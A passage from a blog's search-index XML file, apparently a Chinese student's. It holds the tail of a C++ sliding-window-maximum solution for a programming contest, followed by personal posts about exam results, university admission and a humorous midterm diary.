r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line"><span class="keyword">if</span> (i-k&gt;=c[l]) l++;</div><div class="line">&#125;</div><div class="line"><span class="keyword">write</span>(<span class="string">q[l]</span>);</div><div class="line">puts(<span class="string">""</span>);</div><div class="line">l=<span class="number">1</span>;</div><div class="line">r=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=k;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&lt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (;i&lt;=n;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">write</span>(<span class="string">q[l]</span>);</div><div class="line">putchar(<span class="string">' '</span>);</div><div class="line"><span class="keyword">while</span> (<span class="string">q[r]</span>&lt;=a[i]&amp;&amp;r&gt;=l) r--;</div><div class="line">c[++r]=i;</div><div class="line"><span class="string">q[r]</span>=a[i];</div><div class="line"><span class="keyword">if</span> (i-k&gt;=c[l]) l++;</div><div class="line">&#125;</div><div class="line"><span class="keyword">write</span>(<span class="string">q[l]</span>);</div><div class="line">puts(<span class="string">""</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>果然 AC 了。<br>这个倒是比较符合我对 G++ 的印象<br>一般 -o 是不会有什么优化的<br>那这个问题就比较无聊了。。。<br>真正用的时候肯定不是 -o 。。。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>THE LAST</title>
      <url>/blog/2015/07/18/block1/</url>
      <content type="html"><![CDATA[<p>The Last 标着日语的基本都是韩语。。。刚开始简直吓死。。。xyz说有枪片但我感觉噪声太大。。。最后竟然还是坚持看完了韩语版 ←_← xyz说得对。就是个爱情片。</p><p>=============以上火影============<br>===========以下非常见风格=========</p><p>＄失去出路的竞赛<br>。。。现在再说也没关系了(不鄙视我就好)。不少屌爆屌惯了的骚年哪个不是报着直接保送的心态走进竞赛的呢(并非胡扯)。。。是以fancy说预录取就是太弱了我觉得还是很能理解他的。当然我还是太天真了。。。政策不同啊而且更重要的是实力不同啊。。。XY口中上届很差劲的人其实我一个都打不过呀。。。他说你们这些这些这些都学会了吧我只能说还在看。。。到最后却是大多数人第一步就出不来大家就不停地比暴力啊乱搞啊。。。完全超越我的想象。。。</p><p>＄改变人生的自招<br>余姚市新建小学(不知名)→余姚实验学校(市知名)→杭州学军中学(省知名)—浙江大学 上海交通大学(国知名)<br>。。。简直是不枉此生。。。虽然最后上不了浙大上交但是都算是搞到了降分吧。。。<br>如果没有前两次我有可能还会纠结要不要学自选模块。。。如果没有第三次(其实要不是那年运气好又哪来的联赛一等呢这事儿很多人也不知道吧)。。。爸妈我落差就不会这么大吧。。。</p><p>＄不怎么样的大考<br>小学升学考(虽然没什么卵用)比平时差。<br>初中升学考(虽然放水空了好多)认真做的科目也比平时差。<br>高中升学考？。。。本来就觉得我这种偏科的人哪来的优势呢？然后发现数学比较稳。。。发现理综分值还是很大的。。。于是高三滚粗竞赛的我又燃起希望。。。不过。。。“都是虚幻”。</p><p>＄恼羞神伤的父母<br>出分前一天就有人来关心我的成绩。。。出分那天的白天我在浪(还发了条说说。我妈也改了一个签名)。。。看分的时候我想的是“哦这门差不多” “。。。半分都不给啊 〒_〒 ” “？！？！” “差不多” “果然是估对的” “艹 真低啊”。。。上交降40马上就出现了。我爸妈也开始接到电话了。每个人都以一种浙大没问题的口吻来询问。。。现实世界不随着我们的主观而转移地缓慢却坚决地驶向谷底。。。不眠之夜。对我爸妈。还有黑色好多天。</p><p>＄值得珍爱的世界<br>出分几分钟之内就有人主动向我报了成绩。。。我很难过。因为毕竟差了几十分。。。我告诉她交朋友也得是同level的吧。。。但是她不断地安慰我而实际上我连成绩都隐瞒了她。。。我的泪腺终于爆了。。。又想了一些事。于是我写下了“垫底就垫底吧。我还爱着这个世界。”估计点赞的都是不明真相的围观群众然而这些赞也是我走下去动力的一部分吧。。。第二天白天又有人告诉我你还有浙大自招还有希望的于是我又写下了“暂时不要有了。破灭的时候只会更伤心吧。”不幸言中。浙大降20。。。我推掉了所有活动。却引来了另一些人来关爱我了。我想我说的是没错的。我爱这个世界。</p><p>＄连接未知的起点<br>大多数人填志愿都是挺麻烦的吧。。。当然我也是。。。想想这么差也就随便读个大学好了。。。反正都是没听说过的大学。。。结果还是问来问去不能不算努力地填了好几天。。。最后进了河海大学.南京.江苏。。。在一个水利神校学计算机。。。不过也不要紧了。。。反正是起点嘛</p><p><em>本文首发于QQ空间</em></p>]]></content>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>期中游记</title>
      <url>/blog/2014/11/22/block0/</url>
      <content type="html"><![CDATA[<p>本欲“说说”，不想太多。但以此次道路曲折，景致奇葩，槽点满满，令人长文不自禁。——ZY<br>【本文是一篇关于期中考的长日志。大家可以散了  =。=   ——zyyyyy】</p><p>最开始看到座位号还没反应过来。<br>后来仔细一看！卧槽！这种 “0213” 的座位号明显就是 狂拽酷炫叼霸天带我装逼带我飞 啊！<br>【希望下次有个什么“0233” 之类的  ←_← 】</p><h3 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h3><p>起床就感觉到扁桃体好痛。<br>马上又感觉肚子疼。<br>然后上厕所不小心把裤子弄湿了。。。<br>昨天父母刚把衣服都洗了。。。<br>翻了半天翻到一条牛仔裤。。。<br>上吧，牛仔裤。。。</p><h4 id="语文"><a href="#语文" class="headerlink" title="语文"></a>语文</h4><p>考试的时候头痛鼻塞扁桃体痛肚子痛。<br>刚开始我还没想到“浑身难受” 。。。<br>后来一想到就停不下来了！<br>“大力” 真的是无限循环啊！<br>直接导致我作文里出现了“大力”“滑板鞋”“摩擦摩擦” ！42分。。。<br>【这个好多人都已经亲眼看到了哦！绝对是真的  www 】</p><h4 id="物理"><a href="#物理" class="headerlink" title="物理"></a>物理</h4><p>这绝对是最能给我“我不是不劳而获” 的实感的学科。<br>考试前一天做了5小时+的物理，我竟然还没疯掉！<br>当然刚开始最简单的想法是“我就不信我到不了平均分！”。<br>【呵呵。你不还是没到吗！Silly B ！】<br>咳咳。为了避免厌烦直接拿了三本教辅。<br>比如一年前买的当时还是空白的教材完全解读。<br>还有常用的五三和天利。<br>我已经完全无法理解我的计算能力是什么鬼了。<br>折算一下做10个大题只能全对1题！！！<br>【其中还包含了某些只有字母没有数据的题 】<br>呵呵呵考试的时候果然又算错两个地方。。。<br>吃午饭的时候估分79。显然是到不了平均分了。<br>导致午觉刚开始没睡着。后来被吵醒才起来进考场。。。</p><h4 id="生物"><a href="#生物" class="headerlink" title="生物"></a>生物</h4><p>没睡醒。貌似翻卷速度吓到人了。。。<br>【那是因为你根本没仔细看吧！】<br>一考完就有选择题答案。。。<br>【艾丽姐实在是太敬业了。。。Orz】<br>当时对完选择题直接被虐爆没心情估分了。<br>最后选择题变成了 3题多种答案、2题作废送分。<br>【。。。出卷老师也是蛮拼的。 OTZ】</p><h3 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h3><p>各种原因。还是穿了牛仔裤。。。</p><h4 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h4><p>我觉得。任何一个有志之士都应该以AK数学为目标。<br>【去屎吧！你AK过几次啊 = = 以前考85还能进前50。现在考135都快飞出前100了。】<br>。。。。。。<br>收卷前50分钟：翔翔翔后回场。写下最后一大题的“解”。<br>不久后：做完最后一大题去做跳过的一道填空题。<br>2分钟后：这题很水。完成全卷。开始检查。<br>收卷前3分钟：第？次检查最后一题。感觉好像有很大问题。<br>收卷前1.5分钟：完全确认！最后一题！从第一行开始就错了！<br>收卷前1分钟：卧槽！整个人都要炸了！随手改了两三行！<br>收卷后：积愤已深。在走廊上大喊“我最后一题错光了啊！”<br>。。。。。。<br>批完的答卷 ：我这整道题只对了两三行的竟然比别人完全做对一小题的还扣得少。。。<br>我都想冲上去改分了！想想还是算了。。。<br>狗屎运一次也没什么。。。</p><h4 id="化学"><a href="#化学" class="headerlink" title="化学"></a>化学</h4><p>“离考试结束还有15分钟”的时候我正在厕所进行艰苦卓绝的斗争。<br>回场以后写同分异构体在不停地成环。。。<br>。。。想了半天突然想到了酰胺键（不知道能不能叫肽键）。。。<br>氮、氧、不饱和度 全解决了。。。<br>“成环”“成环”。。。一定是跟化竞玩太多了。。。<br>【呸。明明是自己太蠢！ 】</p><h4 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h4><p>直接当成娱乐科目了。。。<br>发卷前几分钟喊了一句“我笔袋忘在外面了！”<br>然后淡定地出去拿了笔袋。。。<br>【然后就被阅读虐傻了 ←_←】<br>交卷前改对了两道完形改错了两道阅读。<br>【简单地说。脑子有坑。】 </p><p>。。。第二次进前100 ——大概是考得最好的一次。。。<br>【还不是被别人考得最差的一次虐爆！ ←_←】<br>以及第一次████。醉了。。。。。。</p><p>感觉还是要打出自己的节奏啊。。。<br>上次就完全被试卷和时间牵着走了。。。</p><p>——————————————————————————————————————————————</p><p>秋游挺好的。大概是因为一起去的人多。。。</p><p>傻勇和yyc都落水了 hhhhhhhhhhhhh</p><p>我会说我湿了鞋吗   ←_←</p><p>看了一次演出。演出倒是没啥好看的。<br>感觉就是在卖肉吧。。。。。。<br>妆好浓。布好少。就酱。<br>倒是这个大剧院实在是远超我的想象！！！<br>门票上写的“移动席 2排” 。<br>刚开始完全没有明白。<br>但是突然我们的座位就开始摩擦摩擦了！！！<br>滚来滚去真是好玩儿极了！  【→_→  智商呢。。。】<br>后来这舞台上还能出现小池子！<br>还能出现小桥！<br>还能出现小瀑布！<br>绝对是真的水啊！【因为好多人都被溅了  ←_←】 </p><p>——————————————————————————————————————————————</p><p>他略。 或待补。</p><p>完。 错字请讲。</p><p><em>本文首发于QQ空间</em></p>]]></content>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
